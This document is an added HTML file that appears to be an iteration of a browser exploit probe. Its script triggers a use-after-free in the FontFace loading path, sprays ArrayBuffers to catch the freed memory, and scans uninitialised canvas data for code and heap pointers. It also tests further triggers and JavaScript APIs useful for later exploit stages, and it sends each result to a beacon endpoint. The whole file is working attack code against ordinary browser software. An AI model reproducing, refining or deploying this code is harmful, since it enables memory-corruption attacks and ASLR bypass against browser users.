@@ -1,0 +1,237 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p1103v2</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:12px/1.5 monospace;padding:12px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.hit{color:#ff6;font-weight:bold}.ptr{color:#f6f;font-weight:bold}.fail{color:#f66}.ok{color:#6f6}.info{color:#6cf}.crit{color:#f00;font-weight:bold;font-size:13px}.win{color:#0f0;font-weight:bold;font-size:14px}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}</style>
+</head><body>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);L.scrollTop=L.scrollHeight;}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex(v){return'0x'+v.toString(16);}
+
+B('P1103v2-BOOT','');
+
+// === MINIMAL TRIGGER — proven P1099/P1100v2 shape ===
+var styleEl=document.createElement('style');
+styleEl.textContent="@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(styleEl);
+var f0=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(f0);void f0.loaded;
+
+var firedHere=false,uafBuf=null,uafPtrs=null,uafIdx=-1;
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+  if(firedHere)return undefined;firedHere=true;
+  if(styleEl)styleEl.remove();try{document.fonts.delete(this);}catch(e){}
+  document.body.offsetHeight;
+  // Spray: 32 buffers at 192B (wide net)
+  var bufs=[];
+  for(var i=0;i<32;i++)bufs.push(new ArrayBuffer(192));
+  try{document.fonts.check('1em s0');}catch(e){}
+  // Inline scan
+  if(typeof BigUint64Array!=='undefined'){
+    for(var i=0;i<bufs.length;i++){
+      var b=new BigUint64Array(bufs[i]);
+      var nz=0;for(var q=0;q<b.length;q++)if(b[q]!==0n)nz++;
+      if(nz>0){
+        uafBuf=b;uafIdx=i;uafPtrs=[];
+        for(var q=0;q<b.length;q++)if(b[q]!==0n)uafPtrs.push({off:q*8,val:b[q]});
+        b[0]=0x100n;
+        B('P1103v2-UAF1','buf='+i+'|'+uafPtrs.map(function(p){return'+'+hex(p.off)+'='+hex(p.val);}).join(','));
+        break;
+      }
+    }
+  }
+  return undefined;
+},set:function(){}});
+document.fonts.load('1em f0, s0','AB').then(function(){},function(){});
+
+// === ALL TESTS DEFERRED 800ms ===
+setTimeout(function(){
+  if(!uafBuf){B('P1103v2-NOHIT','');return;}
+  log('ok','UAF1 stable buf#'+uafIdx+'. Running 5 test vectors...');
+  var ps=uafPtrs.map(function(p){return hex(p.off)+'='+hex(p.val);}).join(', ');
+  log('ptr',ps);
+
+  // ------ PART A: Alternative triggers ------
+  log('phase','[A-D] Alternative second UAF triggers');
+
+  // A: FontFace.loaded
+  var hit_a=false,fired_a=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired_a)return undefined;fired_a=true;hit_a=true;
+    B('P1103v2-TRIG-A','fired');return undefined;
+  },set:function(){}});
+  try{var ffA=new FontFace('tA','local(Arial)');ffA.load();}catch(e){}
+
+  setTimeout(function(){
+    log('info','[A] FontFace.loaded: '+(hit_a?'FIRED':'no'));
+
+    // B: FontFaceSet.ready
+    var hit_b=false,fired_b=false;
+    try{
+      var fsp=Object.getPrototypeOf(document.fonts);
+      Object.defineProperty(fsp,'then',{configurable:true,get:function(){
+        if(fired_b)return undefined;fired_b=true;hit_b=true;
+        B('P1103v2-TRIG-B','fired');return undefined;
+      },set:function(){}});
+      void document.fonts.ready;
+    }catch(e){}
+
+    setTimeout(function(){
+      log('info','[B] FontFaceSet.ready: '+(hit_b?'FIRED':'no'));
+
+      // C: Manual ff.load()
+      var hit_c=false,fired_c=false;
+      Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+        if(fired_c)return undefined;fired_c=true;hit_c=true;
+        B('P1103v2-TRIG-C','fired');return undefined;
+      },set:function(){}});
+      try{var ffC=new FontFace('tC','local(Courier)');ffC.load();}catch(e){}
+
+      setTimeout(function(){
+        log('info','[C] ff.load() chain: '+(hit_c?'FIRED':'no'));
+
+        // D: Fresh fonts.load after clear
+        var hit_d=false,fired_d=false;
+        Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+          if(fired_d)return undefined;fired_d=true;hit_d=true;
+          B('P1103v2-TRIG-D','fired');return undefined;
+        },set:function(){}});
+        try{document.fonts.clear();}catch(e){}
+        var stD=document.createElement('style');
+        stD.textContent="@font-face{font-family:fD;src:local(Times);unicode-range:U+0045;}";
+        document.head.appendChild(stD);
+        var ffD=new FontFace('gD','local(Helvetica)',{unicodeRange:'U+0045'});
+        document.fonts.add(ffD);void ffD.loaded;
+        try{document.fonts.load('1em gD, fD','EE').then(function(){},function(){});}catch(e){}
+
+        setTimeout(function(){
+          log('info','[D] Fresh fonts.load: '+(hit_d?'FIRED':'no'));
+          B('P1103v2-TRIGGERS','A='+hit_a+'|B='+hit_b+'|C='+hit_c+'|D='+hit_d);
+
+          // ------ PART B: Canvas uninit memory scan ------
+          log('','');
+          log('phase','[E] Canvas uninit memory code pointer scan');
+          var codePtrs=[],heapPtrs=[];
+          try{
+            // Small canvas first
+            var c1=document.createElement('canvas');c1.width=512;c1.height=2;
+            var x1=c1.getContext('2d');
+            x1.fillStyle='rgba(0,0,0,0)';x1.fillRect(0,0,1,1);
+            var d1=x1.getImageData(0,0,512,2).data;
+            var v1=new DataView(d1.buffer);
+            for(var i=0;i<d1.length-7;i+=4){
+              var lo=v1.getUint32(i,true),hi=v1.getUint32(i+4,true);
+              if(hi>=1&&hi<=7&&lo!==0&&lo!==0xafafafaf)codePtrs.push({off:i,hi:hi,lo:lo});
+              if(hi>=8&&hi<=0x20&&lo!==0)heapPtrs.push({off:i,hi:hi,lo:lo});
+            }
+            log('info','Canvas1 '+d1.length+'B: code='+codePtrs.length+' heap='+heapPtrs.length);
+
+            // Large canvas after GC
+            var g=[];for(var i=0;i<3000;i++)g.push(new ArrayBuffer(4096));g=null;
+            var c2=document.createElement('canvas');c2.width=2048;c2.height=4;
+            var x2=c2.getContext('2d');
+            x2.fillStyle='rgba(0,0,0,0)';x2.fillRect(0,0,1,1);
+            var d2=x2.getImageData(0,0,2048,4).data;
+            var v2=new DataView(d2.buffer);
+            var cp2=[],hp2=[];
+            for(var i=0;i<d2.length-7;i+=4){
+              var lo=v2.getUint32(i,true),hi=v2.getUint32(i+4,true);
+              if(hi>=1&&hi<=7&&lo!==0&&lo!==0xafafafaf)cp2.push({off:i,hi:hi,lo:lo});
+              if(hi>=8&&hi<=0x20&&lo!==0)hp2.push({off:i,hi:hi,lo:lo});
+            }
+            log('info','Canvas2 '+d2.length+'B: code='+cp2.length+' heap='+hp2.length);
+
+            var allCode=codePtrs.concat(cp2);
+            if(allCode.length>0){
+              log('crit','CODE POINTERS FOUND: '+allCode.length);
+              var cs=allCode.slice(0,8).map(function(p){return'@'+p.off+':0x'+p.hi.toString(16)+p.lo.toString(16).padStart(8,'0');}).join(',');
+              log('ptr',cs);
+              B('P1103v2-CODE',cs);
+            }else{
+              B('P1103v2-CANVAS','c1_code='+codePtrs.length+'|c2_code='+cp2.length+'|c1_heap='+heapPtrs.length+'|c2_heap='+hp2.length);
+            }
+            var allHeap=heapPtrs.concat(hp2);
+            if(allHeap.length>0){
+              var hs=allHeap.slice(0,5).map(function(p){return'0x'+p.hi.toString(16)+p.lo.toString(16).padStart(8,'0');}).join(',');
+              log('ptr','Canvas heap: '+hs);
+            }
+          }catch(e){log('fail','Canvas err: '+e.message);B('P1103v2-CANVAS-ERR',e.message);}
+
+          // ------ PART C: API detection ------
+          log('','');
+          log('phase','[F] API surface detection');
+          var wr=typeof WeakRef!=='undefined';
+          var fr=typeof FinalizationRegistry!=='undefined';
+          var px=typeof Proxy!=='undefined';
+          var ss=typeof Symbol!=='undefined'&&typeof Symbol.species!=='undefined';
+          var si=typeof Symbol!=='undefined'&&typeof Symbol.iterator!=='undefined';
+          var rr=typeof Reflect!=='undefined';
+          var abx=typeof ArrayBuffer.prototype.transfer!=='undefined';
+          var rab=typeof SharedArrayBuffer!=='undefined';
+          var wa=typeof WebAssembly!=='undefined';
+          log('info','WeakRef='+wr+' FinReg='+fr+' Proxy='+px);
+          log('info','Symbol.species='+ss+' Symbol.iterator='+si+' Reflect='+rr);
+          log('info','AB.transfer='+abx+' SharedAB='+rab+' Wasm='+wa);
+
+          // Test FinalizationRegistry callback
+          var frCleanup=false;
+          if(fr){
+            try{
+              var reg=new FinalizationRegistry(function(v){frCleanup=true;B('P1103v2-FR-CLEAN',v);});
+              var tgt={x:1};reg.register(tgt,'freed');tgt=null;
+              var gc=[];for(var i=0;i<10000;i++)gc.push(new ArrayBuffer(1000));gc=null;
+            }catch(e){}
+          }
+
+          // Test Symbol.species on ArrayBuffer.slice
+          var speciesHit=false;
+          if(ss){
+            try{
+              Object.defineProperty(ArrayBuffer,Symbol.species,{configurable:true,get:function(){
+                speciesHit=true;return ArrayBuffer;
+              }});
+              var tb=new ArrayBuffer(16);tb.slice(0,8);
+            }catch(e){}
+          }
+
+          // Test Proxy with ArrayBuffer
+          var proxyOps=[];
+          if(px){
+            try{
+              var pab=new ArrayBuffer(32);
+              var prx=new Proxy(pab,{get:function(t,p){
+                if(typeof p==='string'&&p!=='then'&&p!=='Symbol(Symbol.toPrimitive)'&&p!=='Symbol(Symbol.toStringTag)')proxyOps.push(p);
+                return Reflect?Reflect.get(t,p):t[p];
+              }});
+              try{new Uint8Array(prx);}catch(e){proxyOps.push('U8err');}
+              try{prx.slice(0);}catch(e){proxyOps.push('sliceErr');}
+              try{structuredClone(prx);}catch(e){proxyOps.push('cloneErr');}
+            }catch(e){proxyOps.push('proxyErr:'+e.message.substring(0,20));}
+          }
+
+          setTimeout(function(){
+            log('info','FinReg cleanup: '+frCleanup);
+            log('info','Species hit on slice: '+speciesHit);
+            log('info','Proxy ops: '+proxyOps.slice(0,10).join(','));
+
+            var apis='wr='+wr+'|fr='+fr+'|px='+px+'|ss='+ss+'|rr='+rr;
+            apis+='|abx='+abx+'|sab='+rab+'|wa='+wa;
+            apis+='|frC='+frCleanup+'|spec='+speciesHit;
+            B('P1103v2-APIS',apis);
+            if(proxyOps.length>0)B('P1103v2-PROXY',proxyOps.slice(0,15).join('|'));
+
+            log('','');
+            log('phase','=== P1103v2 DONE ===');
+            var sum='A='+hit_a+'|B='+hit_b+'|C='+hit_c+'|D='+hit_d;
+            sum+='|code='+(codePtrs.length+cp2.length)+'|heap='+(heapPtrs.length+hp2.length);
+            sum+='|wr='+wr+'|fr='+fr+'|spec='+speciesHit;
+            log('win',sum);
+            B('P1103v2-DONE',sum);
+          },800);
+        },600);
+      },400);
+    },400);
+  },400);
+},800);
+</script>
+</body></html>
